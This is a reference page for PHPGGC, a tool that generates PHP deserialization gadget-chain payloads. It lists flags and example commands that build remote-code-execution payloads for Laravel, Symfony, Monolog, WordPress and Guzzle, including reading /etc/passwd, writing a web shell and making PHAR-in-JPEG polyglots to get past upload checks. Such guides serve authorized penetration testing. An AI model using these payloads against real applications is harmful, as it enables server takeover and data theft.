# PHPGGC

- **Category**: Web / PHP Deserialization
- **Risk Level**: 🔴 High

---

## Description

Generates PHP `unserialize()` payloads (gadget chains) for exploiting insecure deserialization vulnerabilities. Supports 100+ gadget chains across popular PHP frameworks and libraries including Laravel, Symfony, WordPress, Magento, Doctrine, Guzzle, Monolog, and more. Can produce payloads for remote code execution, arbitrary file read/write/delete, SSRF, and other primitives. Supports multiple output wrappers and PHAR-based deserialization. Written in PHP.

## Installation

```bash
sudo apt install phpggc
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `<chain_name>` | Gadget chain to use (positional — e.g., `Laravel/RCE1`, `Symfony/RCE4`) |
| `[parameters]` | Chain-specific arguments (e.g., command to execute, file path) |
| `-l` / `--list` | List all available gadget chains |
| `-i <chain>` | Display detailed information about a specific chain |
| `-w <file>` | PHP wrapper file defining `process_parameters()`, `process_object()`, and `process_serialized()` functions |
| `-s` | Soft URL-encode |
| `-u` | URL-encode the payload |
| `-b` | Base64-encode the output |
| `-j` | JSON-encode the output |
| `-o <file>` | Write output to a file instead of stdout |
| `-a` | Use ASCII strings only (avoid binary) |
| `-n` / `--plus-numbers` | Add `+` in front of numeric values to bypass regex filters like `/O:[0-9]+/` |
| `-f` / `--fast-destruct` | Trigger deserialization immediately after `unserialize()` call (bypasses some checks) |
| `-p` / `--phar <fmt>` | Generate PHAR archive: `phar`, `tar`, or `zip` |
| `--phar-jpeg` | Embed PHAR payload inside a valid JPEG file |

## Common Commands

```bash
# List all available gadget chains
phpggc -l

# List chains for a specific framework
phpggc -l Laravel

# Show info about a specific chain
phpggc -i Laravel/RCE1

# Generate an RCE payload for Laravel
phpggc Laravel/RCE1 system id

# Generate a Symfony RCE payload, Base64-encoded
phpggc -b Symfony/RCE4 system "cat /etc/passwd"

# Generate a URL-encoded payload for Monolog
phpggc -u Monolog/RCE1 system whoami

# Generate a file-write payload (Symfony example)
phpggc Symfony/FW1 /tmp/shell.php /path/to/local/shell.php

# Generate a PHAR-tar archive with fast-destruct
phpggc -f --phar tar Laravel/RCE1 system id -o /tmp/exploit.tar

# Embed payload in a JPEG for file-upload bypass
phpggc --phar-jpeg /path/to/legit.jpg WordPress/RCE1 system id -o /tmp/poly.jpg

# JSON-encoded output for API injection
phpggc -j Guzzle/RCE1 system "id"
```

## Notes & Tips

1. Use `phpggc -l` to review available chains before testing; chain availability depends on the target's framework and library versions.
2. The `-f` / `--fast-destruct` flag restructures the serialized object so that the destructor fires immediately during `unserialize()` — useful for bypassing applications that validate the object before using it.
3. PHAR-based deserialization (`--phar`, `--phar-jpeg`) enables exploitation through file operations (`file_exists()`, `fopen()`, `file_get_contents()`) that trigger `phar://` stream wrapper deserialization — even when `unserialize()` is not called directly.
4. When targeting a file upload endpoint, `--phar-jpeg` produces a polyglot file that passes MIME-type and image-header validation while containing the serialized payload.
5. Always verify the target framework version; gadget chains are version-specific and using the wrong chain produces non-functional payloads.

---

## Official References

- [PHPGGC GitHub](https://github.com/ambionics/phpggc)
- [Kali Tools — phpggc](https://www.kali.org/tools/phpggc/)
